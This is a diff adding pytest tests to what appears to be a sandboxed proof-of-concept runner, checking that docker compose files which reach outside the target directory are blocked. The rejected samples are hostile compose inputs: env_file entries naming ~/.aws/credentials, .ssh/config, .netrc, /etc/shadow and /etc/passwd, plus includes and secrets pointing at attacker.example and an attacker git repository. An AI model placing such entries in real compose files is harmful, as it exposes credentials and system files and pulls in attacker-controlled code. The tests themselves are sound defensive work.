@@ -146,3 +146,80 @@ def test_the_client_starts_by_image_id(monkeypatch):
     assert calls[0][1:5] == ["image", "inspect", "--format", "{{.Id}}"]
     monkeypatch.setattr(runner, "_capture", lambda argv, **kw: runner._Capture(1, "", "no such"))
     assert runner.image_id(Path("docker"), "missing:1") is None
+
+
+# --- the raw compose file, before docker compose reads it (self-audit of 2026-11-13) ---------
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "services:\n  web:\n    env_file: /home/someone/.aws/credentials\n",
+        "services:\n  web:\n    env_file: ../../.ssh/config\n",
+        "services:\n  web:\n    env_file: ${HOME}/.netrc\n",
+        "services:\n  web:\n    env_file: ~/.env\n",
+        "services:\n  web:\n    env_file:\n      - .env\n      - C:\\Users\\someone\\secrets.env\n",
+        "services:\n  web:\n    env_file:\n      - path: /etc/shadow\n        required: false\n",
+        "services:\n  web:\n    env_file: [.env, '/etc/passwd']\n",
+        "services:\n  web:\n    extends:\n      file: ../../other/compose.yml\n      service: x\n",
+        "include:\n  - git@github.com:attacker/stack.git\nservices:\n  web:\n    image: x\n",
+        "include:\n  - ./local.yml\nservices:\n  web:\n    image: x\n",
+        "secrets:\n  key:\n    file: //attacker.example/share/key\n",
+    ],
+)
+def test_the_raw_compose_file_may_not_name_outside_or_remote_files(text):
+    assert app.raw_compose_errors(text), text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "services:\n  web:\n    image: python:3.12-slim\n    environment:\n      A: b\n",
+        "services:\n  web:\n    env_file: .env\n",
+        "services:\n  web:\n    env_file:\n      - ./config/app.env\n      - path: ./extra.env\n",
+        "services:\n  web:\n    build:\n      context: .\n      dockerfile: docker/Dockerfile\n",
+        "services:\n  web:\n    extends:\n      file: ./base.yml\n      service: base\n",
+        "secrets:\n  key:\n    file: ./secrets/key.txt\n",
+    ],
+)
+def test_the_raw_compose_check_keeps_files_inside_the_target(text):
+    assert app.raw_compose_errors(text) == []
+
+
+def test_an_unsafe_raw_compose_file_never_reaches_docker_compose(tmp_path, monkeypatch):
+    from types import SimpleNamespace
+
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "compose.yml").write_text(
+        "services:\n  web:\n    image: x\n    env_file: /etc/passwd\n", encoding="utf-8"
+    )
+
+    def no_compose(*args, **kwargs):
+        raise AssertionError("docker compose must not run")
+
+    monkeypatch.setattr(app, "_compose", no_compose)
+    ctx = SimpleNamespace(run_dir=tmp_path, run_id="r", target_dir=target, options={})
+    harness = {
+        "finding_id": "KF-1",
+        "level": "app",
+        "success_regex": "KALKAN_POC_OK",
+        "app": {"compose_file": "compose.yml", "service": "web", "port": 80, "requests": []},
+    }
+    result = app.run_app_poc(ctx, "T0001-poc_build", harness, Path("docker"))
+    assert result["status"] == "blocked" and result["blocker"] == "sandbox_app_unsafe"
+    assert "env_file" in result["observed_result"]
+
+
+def test_compose_runs_without_remote_resources(monkeypatch):
+    env = app.compose_env()
+    assert env["COMPOSE_EXPERIMENTAL_GIT_REMOTE"] == "false"
+    assert env["COMPOSE_EXPERIMENTAL_OCI_REMOTE"] == "false"
+
+
+def test_a_dockerfile_outside_the_target_is_refused(tmp_path):
+    build = {"context": str(tmp_path), "dockerfile": "../outside/Dockerfile"}
+    errors = app.policy_errors(config(web=service(build=build)), tmp_path)
+    assert any("Dockerfile outside" in e for e in errors)
+    inside = {"context": str(tmp_path), "dockerfile": "docker/Dockerfile"}
+    assert app.policy_errors(config(web=service(build=inside)), tmp_path) == []
